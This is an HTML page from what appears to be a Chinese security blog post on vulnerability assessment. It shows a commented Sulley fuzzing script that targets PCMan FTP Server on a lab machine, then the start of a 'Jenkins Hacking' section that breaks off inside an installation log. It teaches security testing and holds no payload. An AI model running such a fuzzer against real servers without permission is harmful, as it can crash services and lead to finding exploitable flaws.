@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <title>
+        
+        漏洞评估 · \xeb\xfe&#39;s Blog
+        
+    </title>
+    <link rel="icon" href= /assests/favicon.ico>
+    <!-- TODO: 在font-face加载完毕后改变字体  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
+<script>
+hljs.initHighlightingOnLoad();
+$('pre code').each(function(i, block) {
+  //hljs.highlightBlock(block);
+  var lines = $(this).text().split('\n').length - 1;
+  var $numbering = $('<ul/>').addClass('pre-numbering');
+  $(this)
+    .addClass('has-numbering')
+    .parent()
+    .append($numbering);
+  for(i=1;i<=lines;i++){
+    $numbering.append($('<li/>').text(i));
+  }
+});
+</script>
+<style>
+code.has-numbering {
+  margin-left: 10px;
+  word-wrap: normal;
+  word-break: keep-all;
+  white-space: pre;
+}
+
+.pre-numbering {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 20px;
+  height: 100%;
+  padding: .5em 0.2em .5em 0;
+  border-right: 1px solid #C3CCD0;
+  border-radius: 3px 0 0 3px;
+  background-color: #EEE;
+  text-align: right;
+  font-size: 1.0em;
+  color: #AAA;
+  list-style: none;
+}
+@media (max-width: 767px) {
+  .pre-numbering {
+    display: none;
+  }
+  .has-numbering {
+    margin-left: -10px !important;
+    word-wrap: break-world !important;
+    white-space: pre-wrap !important;
+  }
+}
+overflow-x: auto;
+overflow-y: auto;
+word-break: keep-all;
+white-space: pre;
+</style>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.12.0/build/styles/default.min.css">
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.12.0/build/highlight.min.js"></script>
+    <!-- 提前加载place holder  -->
+    <style type="text/css">
+        @font-face {
+            font-family: 'Oswald-Regular';
+            src: url(/font/Oswald-Regular.ttf);
+        }
+    </style>
+    <style type="text/css">
+        .site-intro-placeholder {
+            position: absolute;
+            z-index: -2;
+            top: 0;
+            left: 0px;
+            width: calc(100% + 300px);
+            height: 100%;
+            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+            background-position: center center;
+            transform: translate3d(-226px, 0, 0);
+            animation: gradient-move 2.5s ease-out 0s 1;
+        }
+        @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+    <link rel="stylesheet" href = /css/style.css?v=20171020 />
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    
+    <script src="/scripts/main.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >\xeb\xfe&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">漏洞评估</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>\xeb\xfe's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(http://oumn0o088.bkt.clouddn.com/post-bg.jpg)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            漏洞评估
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = 漏洞评估>漏洞评估</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2017/12/15</span>
+            </div>
+        
+    </div>
+</div>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <script>
+            var browser = {
+                    versions: function () {
+                        var u = window.navigator.userAgent;
+                        return {
+                            userAgent: u,
+                            trident: u.indexOf('Trident') > -1, //IE内核
+                            presto: u.indexOf('Presto') > -1, //opera内核
+                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+                            iPad: u.indexOf('iPad') > -1, //是否为iPad
+                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+                        };
+                    }()
+                }
+
+            function fontLoaded(){
+                console.log('font loaded');
+                if (document.getElementsByClassName('site-intro-meta')) {
+                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+                        if (postIntroTags) {
+                            postIntroTags.classList.add('post-fade-in');
+                        }
+                        if (postIntroMeat) {
+                            postIntroMeat.classList.add('post-fade-in');
+                        }
+                    }
+                }
+                
+            console.log("userAgent:" + browser.versions.userAgent);
+            // UC不支持跨域，所以直接显示
+            if (browser.versions.uc) {
+                console.log("UCBrowser");
+                fontLoaded();
+            } else {
+                WebFont.load({
+                    custom: {
+                        families: ['Oswald-Regular']
+                    },
+                    loading: function () {  //所有字体开始加载
+                        // console.log('loading');
+                    },
+                    active: function () {  //所有字体已渲染
+                        fontLoaded();
+                    },
+                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+                        console.log('inactive: timeout');
+                        fontLoaded();
+                    },
+                    timeout: 7000 // Set the timeout to two seconds
+                });
+            }
+        </script>
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="网络评估"><a href="#网络评估" class="headerlink" title="网络评估"></a>网络评估</h1><h2 id="Fuzzers-sulley"><a href="#Fuzzers-sulley" class="headerlink" title="Fuzzers-sulley"></a>Fuzzers-sulley</h2><p>代码(fuzz_PCManftpd32.py)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># 视频1使用Sulley框架的实现fuzz</span></span><br><span class="line"><span class="comment"># http://www.dfate.de/public/index.php/post/exploit-development-series-video-1-practical-fuzzing-basics-using-the-sulley-framework</span></span><br><span class="line"><span class="comment"># https://www.exploit-db.com/exploits/37731/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Usage:</span></span><br><span class="line"><span class="comment"># C:\Fuzzing\sulley&gt;python network_monitor.py -d 0 -f "port 21" -P audit</span></span><br><span class="line"><span class="comment"># C:\Fuzzing\sulley&gt;python process_monitor.py -c audit\pcmanftpd_crashbin -p "PCManFTPD2.exe"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 分析:</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">220 PCMan's FTP Server 2.0 Ready.</span></span><br><span class="line"><span class="string">USER anonymous</span></span><br><span class="line"><span class="string">331 User name okay, need password.</span></span><br><span class="line"><span class="string">PASS password12345</span></span><br><span class="line"><span class="string">230 User logged in</span></span><br><span class="line"><span class="string">PORT 192,168,1,106,206,27</span></span><br><span class="line"><span class="string">200 Command okay.</span></span><br><span class="line"><span class="string">STOR demo2.txt</span></span><br><span class="line"><span class="string">150 File status okay; Open data connection.</span></span><br><span class="line"><span class="string">226 Data Sent okay.</span></span><br><span class="line"><span class="string">PORT 192,168,1,106,206,28</span></span><br><span class="line"><span class="string">200 Command okay.</span></span><br><span class="line"><span class="string">LIST</span></span><br><span class="line"><span class="string">150 File status okay; Open data connection.</span></span><br><span class="line"><span class="string">226 Data Sent okay.</span></span><br><span class="line"><span class="string">PORT 192,168,1,106,206,29</span></span><br><span class="line"><span class="string">200 Command okay.</span></span><br><span class="line"><span class="string">RETR demo2.txt</span></span><br><span class="line"><span class="string">150 File status okay; Open data connection.</span></span><br><span class="line"><span class="string">226 Data Sent okay.</span></span><br><span class="line"><span class="string">QUIT</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sulley <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 总体概述</span></span><br><span class="line"><span class="comment">#1.创建请求（定义模糊语法）</span></span><br><span class="line"><span class="comment">#2.定义会话</span></span><br><span class="line"><span class="comment">#3.定义目标</span></span><br><span class="line"><span class="comment">#4.fuzz！</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s_initialize - 构建一个新的请求</span></span><br><span class="line"><span class="comment"># s_static ("USER") - 一个静态（未改变）的字符串，不会被fuzz</span></span><br><span class="line"><span class="comment"># s_delin(" ") - 可以fuzz的分隔符，将有不同的使用s_string的变动</span></span><br><span class="line"><span class="comment"># s_string("anonymous") - 一个将被变动的字符串。 包含比s_delim更多的变动</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 语法测试</span></span><br><span class="line">s_initialize(<span class="string">"user"</span>)</span><br><span class="line">s_static(<span class="string">"USER"</span>)</span><br><span class="line">s_delim(<span class="string">" "</span>, fuzzable=<span class="keyword">False</span>)</span><br><span class="line">s_string(<span class="string">"anonymous"</span>)</span><br><span class="line">s_static(<span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">s_initialize(<span class="string">"pass"</span>)</span><br><span class="line">s_static(<span class="string">"PASS"</span>)</span><br><span class="line">s_delim(<span class="string">" "</span>, fuzzable=<span class="keyword">False</span>)</span><br><span class="line">s_string(<span class="string">"pass12345"</span>)</span><br><span class="line">s_static(<span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">s_initialize(<span class="string">"put"</span>)</span><br><span class="line">s_static(<span class="string">"PUT"</span>)</span><br><span class="line">s_delim(<span class="string">" "</span>, fuzzable=<span class="keyword">False</span>)</span><br><span class="line">s_string(<span class="string">"fuzz_strings"</span>)</span><br><span class="line">s_static(<span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">s_initialize(<span class="string">"stor"</span>)</span><br><span class="line">s_static(<span class="string">"STOR"</span>)</span><br><span class="line">s_delim(<span class="string">" "</span>, fuzzable=<span class="keyword">True</span>)</span><br><span class="line">s_string(<span class="string">"AAAA"</span>)</span><br><span class="line">s_static(<span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">s_initialize(<span class="string">"mkd"</span>)</span><br><span class="line">s_static(<span class="string">"MKD"</span>)</span><br><span class="line">s_delim(<span class="string">" "</span>, fuzzable=<span class="keyword">False</span>)</span><br><span class="line">s_string(<span class="string">"AAAA"</span>)</span><br><span class="line">s_static(<span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 定义pre_send函数。 三次握手后会立即执行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_ftp_banner</span><span class="params">(sock)</span>:</span></span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 定义会话</span></span><br><span class="line"><span class="comment"># 会话参数</span></span><br><span class="line">SESSION_FILENAME = <span class="string">"pcmanftpd-session"</span>  <span class="comment"># 跟踪当前的fuzz状态</span></span><br><span class="line">SLEEP_TIME = <span class="number">0.5</span>                        <span class="comment"># 在两次fuzz尝试之间暂停</span></span><br><span class="line">TIMEOUT = <span class="number">5</span>                             <span class="comment"># 没有连接5秒后，fuzz会超时</span></span><br><span class="line">CRASH_THRESHOLD = <span class="number">4</span>                     <span class="comment"># 4次崩溃后，参数将被跳过</span></span><br><span class="line"></span><br><span class="line">mysession = sessions.session(</span><br><span class="line">    session_filename=SESSION_FILENAME,</span><br><span class="line">    sleep_time=SLEEP_TIME,</span><br><span class="line">    timeout=TIMEOUT,</span><br><span class="line">    crash_threshold=CRASH_THRESHOLD)</span><br><span class="line"></span><br><span class="line">mysession.pre_send = receive_ftp_banner</span><br><span class="line">mysession.connect(s_get(<span class="string">"user"</span>))</span><br><span class="line">mysession.connect(s_get(<span class="string">"user"</span>), s_get(<span class="string">"pass"</span>))</span><br><span class="line">mysession.connect(s_get(<span class="string">"pass"</span>), s_get(<span class="string">"stor"</span>))</span><br><span class="line">mysession.connect(s_get(<span class="string">"pass"</span>), s_get(<span class="string">"mkd"</span>))</span><br><span class="line">mysession.connect(s_get(<span class="string">"pass"</span>), s_get(<span class="string">"put"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 绘制代表fuzz路径的图形。</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"session_test.udg"</span>, <span class="string">"w+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(mysession.render_graph_udraw())</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 一些概述输出</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"Number of mutation during one case: %s\n"</span> % str(s_num_mutations()))</span><br><span class="line">print(<span class="string">"Total number of mutations: %s\n"</span> % str(s_num_mutations() * <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">decision = raw_input(<span class="string">"Do you want to continue?(y/n): "</span>)</span><br><span class="line"><span class="keyword">if</span> decision == <span class="string">"n"</span>:</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 定义目标具体参数</span></span><br><span class="line">host = <span class="string">"192.168.1.107"</span></span><br><span class="line">ftp_port = <span class="number">21</span></span><br><span class="line">netmon_port = <span class="number">26001</span></span><br><span class="line">procmon_port = <span class="number">26002</span></span><br><span class="line">target = sessions.target(host, ftp_port)</span><br><span class="line">target.procmon = pedrpc.client(host, procmon_port)</span><br><span class="line">target.netmon = pedrpc.client(host, netmon_port)</span><br><span class="line"></span><br><span class="line">target.procmon_options = &#123;</span><br><span class="line">    <span class="string">"proc_name"</span>: <span class="string">"pcmanftpd2.exe"</span>,</span><br><span class="line">    <span class="string">"stop_commands"</span>: [<span class="string">"wmic process where (name='PCManFTPD2.exe') call terminate"</span>],</span><br><span class="line">    <span class="string">"start_commands"</span>: [<span class="string">"C:\\PCManFTP\\PCManFTPD2.exe"</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将目标添加到会话</span></span><br><span class="line">mysession.add_target(target)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># 让我们开始搞事情</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"Starting fuzzing now"</span>)</span><br><span class="line">mysession.fuzz()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启fuzz进程</span></span><br><span class="line"><span class="comment"># 也可以通过网页界面（http://127.0.0.1:26000）查看当前状态</span></span><br></pre></td></tr></table></figure></p>
+<p>代码分析:<br>该代码通过sulley框架来进行fuzz测试，首先进行语法测试，构造多个新请求(包括FTP的user、pass、put、stor、mkd)，设置静态字符串和FUZZ字符串，然后定义pre_send三次握手后立即执行，定义会话及会话参数，绘制udg格式的fuzz路径图形，输入一些概述后定义目标具体参数，将目标添加到会话中，直接开始搞事情。<br><img src="http://p00fayrsx.bkt.clouddn.com/17-12-14/78012106.jpg" alt=""><br>期间可以通过网页界面(<a href="http://127.0.0.1:26000)查看当前状态" target="_blank" rel="noopener">http://127.0.0.1:26000)查看当前状态</a></p>
+<h2 id="Jenkins-Hacking"><a href="#Jenkins-Hacking" class="headerlink" title="Jenkins Hacking"></a>Jenkins Hacking</h2><ol>
+<li>如何部署jenkins？</li>
+<li>如何利用jenkins服务器？</li>
+</ol>
+<p>Jenkins是一个独立、开源的自动化服务器，可用于自动执行各种任务，如构建，测试和部署软件。Jenkins可以通过本地系统软件包Docker安装，甚至是独立运行在安装java运行环境的任何机器上。</p>
+<h3 id="如何部署jenkins？"><a href="#如何部署jenkins？" class="headerlink" title="如何部署jenkins？"></a>如何部署jenkins？</h3><p>这引导将使用“独立的”Jenkins发行版，该发行版要求最少使用Java 7，但建议使用Java 8。还建议使用超过512MB RAM的系统。</p>
+<ol>
+<li><a href="http://mirrors.jenkins.io/war-stable/latest/jenkins.war" target="_blank" rel="noopener">下载Jenkins</a>.</li>
+<li>在下载目录中打开终端并运行java -jar jenkins.war</li>
+<li>在浏览器中打开http：// localhost：8080并按照说明完成安装。</li>
+<li>许多Pipeline示例需要在与Jenkins相同的计算机上安装Docker。</li>
+</ol>
+<p>请检查安装日志，如下：</p>
+<figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">root@lab:~/Downloads<span class="comment"># java -jar jenkins.war</span></span><br><span class="line">Running from: /root/Downloads/jenkins.war</span><br><span class="line">webroot: $user.home/.jenkins</span><br><span class="line">Mar 15, 2017 5:03:49 AM Main deleteWinstoneTempContents</span><br><span class="line">WARNING: Failed to delete the temporary Winstone file /tmp/winstone/jenkins.war</span><br><span class="line">Mar 15, 2017 5:03:50 AM org.eclipse.jetty.util.log.JavaUtilLog info</span><br><span class="line">INFO: Logging initialized @6168ms</span><br><span class="line">Mar 15, 2017 5:03:50 AM winstone.Logger logInternal</span><br><span class="line">INFO: Beginning extraction from war file</span><br><span class="line">Mar 15, 2017 5:04:05 AM org.eclipse.jetty.util.log.JavaUtilLog warn</span><br><span class="line">WARNING: Empty contextPath</span><br><span class="line">Mar 15, 2017 5:04:06 AM org.eclipse.jetty.util.log.JavaUtilLog info</span><br><span class="line">INFO: jetty-9.2.z-SNAPSHOT</span><br><span class="line">Mar 15, 2017 5:04:10 AM org.eclipse.jetty.util.log.JavaUtilLog info</span><br><span class="line">INFO: NO JSP Support for /, did not find org.eclipse.jetty.jsp.JettyJspServlet</span><br><span class="line">Jenkins home directory: /root/.jenkins found at: $user.home/.jenkins</span><br><span class="line">Mar 15, 2017 5:04:20 AM org.eclipse.jetty.util.log.JavaUtilLog info</span><br><span class="line">INFO: Started w.@30990c1b&#123;/,<span class="attribute">file</span>:/root/<span class="variable">.jenkins</span>/war/,AVAILABLE&#125;&#123;/root/<span class="variable">.jenkins</span>/war&#125;</span><br><span class="line">Mar 15, 2017 5:04:20 AM org<span class="variable">.eclipse</span><span class="variable">.jetty</span><span class="variable">.util</span><span class="variable">.log</span><span class="variable">.JavaUtilLog</span> info</span><br><span class="line">INFO: Started ServerConnector@54227100&#123;HTTP/1.1&#125;&#123;0.0.0.0:8080&#125;</span><br><span class="line">Mar 15, 2017 5:04:20 AM org<span class="variable">.eclipse</span><span class="variable">.jetty</span><span class="variable">.util</span><span class="variable">.log</span><span class="variable">.JavaUtilLog</span> info</span><br><span class="line">INFO: Started @36602ms</span><br><span class="line">Mar 15, 2017 5:04:20 AM winstone<span class="variable">.Logger</span> logInternal</span><br><span class="line">INFO: Winstone Servlet Engine v2.0 running: controlPort=disabled</span><br><span class="line">Mar 15, 2017 5:04:22 AM jenkins<span class="variable">.InitReactorRunner</span>$1 onAttained</span><br><span class="line">INFO: Started initialization</span><br><span class="line">Mar 15, 2017 5:04:23 AM jenkins<span class="variable">.InitReactorRunner</span>$1 onAttained</span><br><span class="line">INFO: Listed all plugins</span><br><span class="line">Mar 15, 2017 5:04:45 AM jenkins<span class="variable">.InitReactorRunner</span>$1 onAttained</span><br><span class="line">INFO: Prepared all plugins</span><br><span class="line">Mar 15, 2017 5:04:45 AM jenkins<span class="variable">.InitReactorRunner</span>$1 onAttained</span><br><span class="line">INFO: Started all plugins</span><br><span class="line">Mar 15, 2017 5:04:45 AM jenkins<span class="variable">.InitReactorRunner</span>$1 onAttained</span><br><span class="line">INFO: Augmented all extensions</span><br><span class="line">Mar 15, 2017 5:04:51 AM jenkins<span class="variable">.InitReactorRunner</span>$1 onAttained</span><br><span class="line">INFO: Loaded all jobs</span><br><span class="line">Mar 15, 2017 5:04:51 AM hudson<span class="variable">.model</span><span class="variable">.AsyncPeriodicWork</span>$1 run</span><br><span class="line">INFO: Started Download metadata</span><br><span class="line">Mar 15, 2017 5:04:52 AM org<span class="variable">.jenkinsci</span><span class="variable">.main</span><span class="variable">.modules</span><span class="variable">.sshd</span><span class="variable">.SSHD</span> start</span><br><span class="line">INFO: Started SSHD at port 43731</span><br><span class="line">Mar 15, 2017 5:04:53 AM jenkins<span class="variable">.InitReactorRunner</span>$1 onAttained</span><br><span class="line">INFO: Completed initialization</span><br><span class="line">Mar 15, 2017 5:04:55 AM org<span class="variable">.springframework</span><span class="variable">.context</span><span class="variable">.support</span><span class="variable">.AbstractApplicationContext</span> prepareRefresh</span><br><span class="line">INFO: Refreshing org<span class="variable">.springframework</span><span class="variable">.web</span><span class="variable">.context</span><span class="variable">.support</span><span class="variable">.StaticWebApplicationContext</span>@4d8c4701: display name [Root WebApplicationContext]; <span class="attribute">startup date [Wed Mar 15 05</span>:04:55 EDT 2017]; <span class="attribute">root of context hierarchy</span></span><br><span class="line"><span class="attribute">Mar 15, 2017 5</span>:04:55 AM org<span class="variable">.springframework</span><span class="variable">.context</span><span class="variable">.support</span><span class="variable">.AbstractApplicationContext</span> obtainFreshBeanFactory</span><br><span class="line">INFO: Bean factory for application context [org<span class="variable">.springframework</span><span class="variable">.web</span><span class="variable">.context</span><span class="variable">.support</span><span class="variable">.StaticWebApplicationContext</span>@4d8c4701]: org<span class="variable">.springframework</span><span class="variable">.beans</span><span class="variable">.factory</span><span class="variable">.support</span><span class="variable">.DefaultListableBeanFactory</span>@16f7f485</span><br><span class="line">Mar 15, 2017 5:04:55 AM org<span class="variable">.springframework</span><span class="variable">.beans</span><span class="variable">.factory</span><span class="variable">.support</span><span class="variable">.DefaultListableBeanFactory</span> preInstantiateSingletons</span><br><span class="line">INFO: Pre-instantiating singletons in org<span class="variable">.springframework</span><span class="variable">.beans</span><span class="variable">.factory</span><span class="variable">.support</span><span class="variable">.DefaultListableBeanFactory</span>@16f7f485: defining beans [authenticationManager]; <span class="attribute">root of factory hierarchy</span></span><br><span class="line"><span class="attribute">Mar 15, 2017 5</span>:04:58 AM org<span class="variable">.springframework</span><span class="variable">.context</span><span class="variable">.support</span><span class="variable">.AbstractApplicationContext</span> prepareRefresh</span><br><span class="line">INFO: Refreshing org<span class="variable">.springframework</span><span class="variable">.web</span><span class="variable">.context</span><span class="variable">.support</span><span class="variable">.StaticWebApplicationContext</span>@1aa6a1d4: display name [Root WebApplicationContext]; <span class="attribute">startup date [Wed Mar 15 05</span>:04:58 EDT 2017]; <span class="attribute">root of context hierarchy</span></span><br><span class="line"><span class="attribute">Mar 15, 2017 5</span>:04:58 AM org<span class="variable">.springframework</span><span class="variable">.context</span><span class="variable">.support</span><span class="variable">.AbstractApplicationContext</span> obtainFreshBeanFactory</span><br><span 